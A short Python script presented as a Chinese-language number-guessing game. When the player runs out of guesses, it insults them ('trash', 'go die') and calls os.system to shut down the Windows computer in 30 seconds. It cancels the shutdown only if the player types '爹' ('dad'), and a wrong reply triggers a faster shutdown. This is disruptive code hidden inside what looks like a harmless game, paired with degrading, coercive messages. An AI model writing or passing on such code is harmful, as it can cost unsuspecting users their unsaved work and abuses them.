import os
import random
from os import system

secret_number = random.randint(1, 1000)
guess_limit = 15
guess_count = 0

print("猜一个1到1000之间的数字。你有15次机会。")

while guess_count < guess_limit:
    try:
        guess = int(input(f"猜一下这个数字是多少：（还剩余{guess_limit - guess_count}次机会）"))
    except ValueError:
        print("输入有效的整数,fw!")
        continue
    
    guess_count += 1
    
    if guess == secret_number:
        print("恭喜你，猜对了！")
        break
    elif guess < secret_number:
        print("你猜的数字太小了，请再试一次。")
    else:
        print("你猜的数字太大了，请再试一次。")
    if guess_count == guess_limit:
        print(f"fw，你没有猜对。正确的数字是{secret_number}。")
        print('去死吧,fw')
        os.system("shutdown /s -t 30 ")
        a=input('喊爹,fw,要不关你机。')
        b='爹'
        if len(a) != 1:
            print('gun')
            os.system("shutdown /s -t 15")
        elif a==b:
            print('好大儿，滚吧')
            os.system("shutdown /a")
